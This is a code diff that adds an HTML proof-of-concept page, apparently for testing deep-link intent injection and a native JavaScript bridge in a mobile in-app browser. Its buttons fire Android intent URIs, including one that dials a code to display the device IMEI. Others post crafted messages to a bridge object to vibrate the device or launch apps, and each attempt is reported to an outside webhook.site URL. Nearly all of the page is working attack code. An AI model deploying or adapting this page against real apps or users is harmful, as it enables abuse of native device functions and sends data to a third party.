@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Critical Impact: System Hijacker</title>
+    <style>
+        body { font-family: sans-serif; background: #0d1117; color: #ff7b72; padding: 20px; text-align: center; }
+        .vuln-card { border: 2px dashed #f85149; padding: 20px; border-radius: 12px; background: #161b22; }
+        .btn { background: #238636; color: white; padding: 12px; border: none; border-radius: 6px; margin: 10px; cursor: pointer; font-weight: bold; width: 80%; }
+        .btn-warn { background: #d29922; }
+    </style>
+</head>
+<body>
+
+    <div class="vuln-card">
+        <h2>System-Level Impact PoC</h2>
+        <p>Testing for Deep Link Injection & Native Bridge Exploitation</p>
+
+        <button class="btn btn-warn" onclick="triggerIntent('intent:#Intent;action=android.settings.WIFI_SETTINGS;end')">1. Force Open WiFi Settings</button>
+        
+        <button class="btn btn-warn" onclick="triggerIntent('tel:*#06#')">2. Leak Device IMEI (Dialer)</button>
+        
+        <button class="btn" onclick="bridgeAttack('vibrate')">3. Trigger System Vibration</button>
+        
+        <button class="btn" onclick="bridgeAttack('openApp')">4. Force Open External App</button>
+
+        <div id="status" style="margin-top:20px; color: #7ee787; font-family: monospace;"></div>
+    </div>
+
+    <script>
+        const webhook = "https://webhook.site/#!/view/f1738809-1a2e-4085-a7d6-e448a2a477b3/75777608-a36d-4d58-a651-82bf24fe174a";
+
+        function triggerIntent(url) {
+            document.getElementById('status').innerText = "> Attempting Intent Injection...";
+            // Exfiltrate the attempt
+            fetch(webhook + "?attack=intent_injection&payload=" + btoa(url));
+            window.location.href = url;
+        }
+
+        function bridgeAttack(type) {
+            const status = document.getElementById('status');
+            if (window.iabjs_unified_bridge) {
+                status.innerText = "> Attacking Bridge: " + type;
+                
+                let payload = {};
+                if(type === 'vibrate') payload = {"action": "vibrate", "duration": 2000};
+                if(type === 'openApp') payload = {"action": "launchApp", "pkg": "com.android.settings"};
+
+                window.iabjs_unified_bridge.postMessage(JSON.stringify(payload));
+                
+                fetch(webhook + "?attack=bridge_fuzzing&type=" + type);
+            } else {
+                status.innerText = "> Bridge not found!";
+            }
+        }
+    </script>
+</body>
+</html>
